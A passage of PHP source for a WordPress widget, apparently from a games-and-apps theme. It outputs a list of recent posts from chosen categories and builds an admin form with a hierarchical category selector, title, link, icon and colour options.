        if ( ! in_array( 0, $category_ids, true ) ) {
            $query_args['category__in'] = $category_ids;
        }
        /* exclude current displayed post */
        
        /* run the query: get the latest posts */
        $rp = new WP_Query( apply_filters( 'widget_categorie_homes__widget_posts_args', $query_args ) );
        if ( 'style_2' === $layout_style ) : ?>
        <?php elseif ( 'style_3' === $layout_style ) : ?>
        <?php elseif ( 'style_4' === $layout_style ) : ?>
        <?php else : ?>
		<div class="entry-list list-c6">
            <?php while ( $rp->have_posts() ) : $rp->the_post(); global $opt_themes,$wpdb, $post, $wp_query; ?>
             <?php get_template_part('template/loop/loop.item.home'); ?>
			<?php  endwhile; ?>
            <?php wp_reset_postdata(); ?>
		</div> 
        <?php
        endif;
        echo $args['after_widget'];  
    } 
    public function update( $new_instance, $old_instance ) {
        $instance     = $old_instance;
        $new_instance = wp_parse_args(
            (array) $new_instance,
            array(
                'title'             => '',
                'title2'			=> '',
                'icon'				=> '',
                'link_title'        => '',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 3,  
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $instance['title'] = sanitize_text_field( $new_instance['title'] );
        $instance['title2'] = sanitize_text_field( $new_instance['title2'] );
        $instance['icon'] = sanitize_text_field( $new_instance['icon'] );
        // Link Title.
        $instance['link_title'] = esc_url( $new_instance['link_title'] );
        /* Category IDs */
        $instance['category_ids'] = array_map( 'absint', $new_instance['category_ids'] );
        /* Style */
        //$instance['layout_style'] = wp_strip_all_tags( $new_instance['layout_style'] );
        /* Number posts */
        $instance['number_posts'] = absint( $new_instance['number_posts'] );
        /* Title Length */ 
        $instance['color_svg'] = esc_attr( $new_instance['color_svg'] );
        /* Show element */ 
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $instance['category_ids'], true ) ) {
            $instance['category_ids'] = array( 0 );
        }
        return $instance;
    }
    /**
     * Outputs the settings form for the most view widget.
     *
     * @since 1.0.0
     * @access public
     *
     * @param array $instance Current settings.
     */
    public function form( $instance ) {
        $instance = wp_parse_args(
            (array) $instance,
            array(
                'title'             => __( 'Popular Games', EX_THEMES_NAMES_ ),
                'title2'			=> __( 'Get More....', EX_THEMES_NAMES_ ),
                'icon'    		    => 'apps',
                'link_title'        => 'https://yoursites.com/categories',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 4, 
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $title = sanitize_text_field( $instance['title'] );
		$title2 = sanitize_text_field( $instance['title2'] );
		$icon = sanitize_text_field( $instance['icon'] );
        // Link Title.
        $link_title = esc_url( $instance['link_title'] );
        /* Category ID */
        $category_ids = array_map( 'absint', $instance['category_ids'] );
        /* Style */
        //$layout_style = wp_strip_all_tags( $instance['layout_style'] );
        /* Number posts */
        $number_posts = absint( $instance['number_posts'] ); 
		$colors_svg			= esc_attr( $instance['color_svg'] ); 
        /* Show element */ 
        /* get categories */
        $categories     = get_categories(
            array(
                'hide_empty'   => 0,
                'hierarchical' => 1,
            )
        );
        $number_of_cats = count( $categories );
        /* get size (number of rows to display) of selection box: not more than 10 */
        $number_of_rows = ( 10 > $number_of_cats ) ? $number_of_cats + 1 : 10;
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* start selection box */
        $selection_category  = sprintf(
            '<select name="%s[]" id="%s" class="cat-select widefat" multiple size="%d">',
            $this->get_field_name( 'category_ids' ),
            $this->get_field_id( 'category_ids' ),
            $number_of_rows
        );
        $selection_category .= "\n";
        /* make selection box entries */
        $cat_list = array();
        if ( 0 < $number_of_cats ) {
            /* make a hierarchical list of categories */
            while ( $categories ) {
                /* if there is no parent */
                if ( 0 === $categories[0]->parent ) {
                    /* get and remove it from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append the current entry to the new list */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => 0,
                    );
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent:
                 * try to find parent in new list and get its array index
                 */
                $parent_index = $this->get_cat_parent_index( $cat_list, $categories[0]->parent );
                /* if parent is not yet in the new list: try to find the parent later in the loop */
                if ( false === $parent_index ) {
                    /* get and remove current entry from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append it at the end of the categories list */
                    $categories[] = $current_entry;
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent and parent is in new list:
                 * set depth of current item: +1 of parent's depth
                 */
                $depth = $cat_list[ $parent_index ]['depth'] + 1;
                /* set new index as next to parent index */
                $new_index = $parent_index + 1;
                /* find the correct index where to insert the current item */
                foreach ( $cat_list as $entry ) {
                    /* if there are items with same or higher depth than current item */
                    if ( $depth <= $entry['depth'] ) {
                        /* increase new index */
                        $new_index = $new_index++;
                        /* go on looping in foreach() */
                        continue;
                    }
                    /**
                     * If the correct index is found:
                     * get current entry and remove it from the categories list
                     */
                    $current_entry = array_shift( $categories );
                    /* insert current item into the new list at correct index */
                    $end_array  = array_splice( $cat_list, $new_index ); /* $cat_list is changed, too */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => $depth,
                    );
                    $cat_list   = array_merge( $cat_list, $end_array );
                    /* quit foreach(), go on while-looping */
                    break;
                } /* End foreach( cat_list ) */
            } /* End while( categories ) */
            /* make HTML of selection box */
            $selected            = ( in_array( 0, $category_ids, true ) ) ? ' selected="selected"' : '';
            $selection_category .= "\t";
            $selection_category .= '<option value="0"' . $selected . '>' . __( 'All Categories', EX_THEMES_NAMES_ ) . '</option>';
            $selection_category .= "\n";
            foreach ( $cat_list as $category ) {
                $cat_name            = apply_filters( 'gmr_list_cats', $category['name'], $category );
                $pad                 = ( 0 < $category['depth'] ) ? str_repeat( '&ndash;&nbsp;', $category['depth'] ) : '';
                $selection_category .= "\t";
                $selection_category .= '<option value="' . $category['id'] . '"';
                $selection_category .= ( in_array( $category['id'], $category_ids, true ) ) ? ' selected="selected"' : '';
                $selection_category .= '>' . $pad . $cat_name . '</option>';
                $selection_category .= "\n";
            }
        }
        /* close selection box */
        $selection_category .= "</select>\n";
        ?>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>"><?php esc_html_e( 'Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title' ) ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title2' ) ); ?>"><?php esc_html_e( 'Title Alt:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title2' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title2' ) ); ?>" type="text" value="<?php echo esc_attr( $title2 ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'link_title' ) ); ?>"><?php esc_html_e( 'Link Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'link_title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'link_title' ) ); ?>" type="url" value="<?php echo esc_attr( $link_title ); ?>" />           
            <small><?php esc_html_e( 'Target url for title (example: https://yoursites.com/categories), leave blank if you want using title without link.', EX_THEMES_NAMES_ ); ?></small>
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'icon' ) ); ?>"><?php esc_html_e( 'Icons:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'icon' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'icon' ) ); ?>" type="text" value="<?php echo esc_attr( $icon ); ?>" />			
            <small>Use <b style="color: blue;">gamepad</b> for Categories Games Icons </small>
			<br />
            <small>Use <b style="color: blue;">apps</b> for Categories Apps Icons </small>
        </p>

        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'color_svg' ) ); ?>"><?php esc_html_e( 'Color Svg Icons:', EX_THEMES_NAMES_ ); ?></label>
            <select class="widefat" id="<?php echo esc_html( $this->get_field_id( 'color_svg', EX_THEMES_NAMES_ ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'color_svg' ) ); ?>">
			<option value="s-yellow" <?php selected( $instance['color_svg'], 's-yellow' ); ?>><?php esc_html_e( 'YELLOW', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-green" <?php selected( $instance['color_svg'], 's-green' ); ?>><?php esc_html_e( 'GREEN', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-purple" <?php selected( $instance['color_svg'], 's-purple' ); ?>><?php esc_html_e( 'PURPLE', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-red" <?php selected( $instance['color_svg'], 's-red' ); ?>><?php esc_html_e( 'RED', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-blue" <?php selected( $instance['color_svg'], 's-blue' ); ?>><?php esc_html_e( 'BLUE', EX_THEMES_NAMES_ ); ?></option>
            </select> 
            <small><?php esc_html_e( 'Select color svg icons.', EX_THEMES_NAMES_ ); ?></small>
        </p> 
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'category_ids' ) ); ?>"><?php esc_html_e( 'Selected categories', EX_THEMES_NAMES_ ); ?></label>
            <?php echo $selection_category; ?> 
            <small><?php esc_html_e( 'Click on the categories with pressed CTRL key to select multiple categories. If All Categories was selected then other selections will be ignored.', EX_THEMES_NAMES_ ); ?></small>
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'number_posts' ) ); ?>"><?php esc_html_e( 'Number post', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'number_posts' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'number_posts' ) ); ?>" type="number" value="<?php echo esc_attr( $number_posts ); ?>" />
        </p>  
        <?php
    }
    /**
     * Return the array index of a given ID
     *
     * @since 1.0.0
     * @param array $arr Array.
     * @param int   $id Post ID.
     * @access private
     */
    private function get_cat_parent_index( $arr, $id ) {
        $len = count( $arr );
        if ( 0 === $len ) {
            return false;
        }
        $id = absint( $id );
        for ( $i = 0; $i < $len; $i++ ) {
            if ( $id === $arr[ $i ]['id'] ) {
                return $i;
            }
        }
        return false;
    } 
} 
add_action(
    'widgets_init',
    function() {
        register_widget( 'widget_categorie_homes_modified_' );
    }
);